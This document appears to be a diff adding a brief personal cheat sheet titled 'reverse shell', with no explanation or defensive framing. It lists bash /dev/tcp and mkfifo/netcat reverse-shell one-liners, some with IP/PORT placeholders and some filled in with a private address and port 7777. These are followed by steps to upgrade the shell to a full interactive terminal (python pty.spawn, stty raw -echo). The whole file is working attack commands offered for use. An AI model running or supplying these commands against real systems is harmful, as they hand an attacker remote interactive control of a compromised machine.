@@ -1,0 +1,13 @@
+reverse shell 
+
+bash -i >& /dev/tcp/IP/PORT 0>&1
+bash -i >& /dev/tcp/10.21.109.242/7777 0>&1
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.21.109.242 7777 > /tmp/f
+
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+ctrl Z
+stty raw -echo; fg
+
